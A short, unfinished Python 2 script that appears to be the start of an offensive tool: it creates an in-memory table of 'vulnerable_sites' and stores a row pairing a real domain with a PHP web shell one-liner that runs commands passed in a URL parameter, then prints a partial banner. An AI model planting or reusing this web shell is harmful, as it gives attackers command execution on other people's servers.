import sqlite3

conn = sqlite3.connect(":memory:")
cursor = conn.cursor()#setting up a memory database at the moment
cursor.execute("create table vulnerable_sites(url text, page text, method text, uploaded_shell text)")

toInsert = ['www.bing.com','about.php','get', '<?php passthru($_GET[\'cmd\']']
cursor.execute("insert into vulnerable_sites values(?,?,?,?)",toInsert)
conn.commit()


def print_banner():
	print "        _       __        __      _    __     __  __ _"
	print "       / \\      \\ \\      / /     |"

def get_input():
	userinput = raw_input("awsmi>")

print_banner()